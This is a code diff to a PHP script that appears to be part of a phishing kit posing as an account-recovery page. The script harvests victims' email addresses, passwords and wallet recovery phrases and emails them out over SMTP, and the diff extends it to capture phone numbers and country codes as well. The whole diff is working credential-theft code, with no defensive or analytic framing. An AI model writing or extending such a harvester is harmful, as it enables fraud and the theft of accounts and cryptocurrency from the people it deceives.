@@ -7,6 +7,9 @@ include_once './config.php';
 $email                  =   $_POST['email'];
 $password               =   $_POST['password'];
 $keys                   =   empty($_POST['keys']) ? null : $_POST['keys'];
+$phone_number           =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
+$phone_code             =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
+$country_code           =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];
 
 if (empty($email) || empty($password)) {
     redirect(base_url('recover.php'));
@@ -16,6 +19,9 @@ if (empty($email) || empty($password)) {
         global $email;
         global $password;
         global $keys;
+        global $phone_number;
+        global $phone_code;
+        global $country_code;
         
         try {
             $mail           =   get_mail_smtp();
@@ -29,6 +35,8 @@ if (empty($email) || empty($password)) {
             $html          .=   '<ul>' ;
             $html          .=   "<li>Email : <b>".$email."</b></li>";
             $html          .=   "<li>Password : <b>".$password."</b></li>";
+            $html          .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
+            $html          .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
             
             if(!empty($keys)) {
                 $html  .=   "<li>Recovery Paraphrase :</li>";
@@ -46,6 +54,9 @@ if (empty($email) || empty($password)) {
             $_SESSION["email"]          =   $email;
             $_SESSION["password"]       =   $password;
             $_SESSION["keys"]           =   $keys;
+            $_SESSION["phone_number"]   =   $phone_number;
+            $_SESSION["phone_code"]     =   $phone_code;
+            $_SESSION["country_code"]   =   $country_code;
             
             if(empty($keys)) {
                 redirect(base_url('paraphrase.php'));
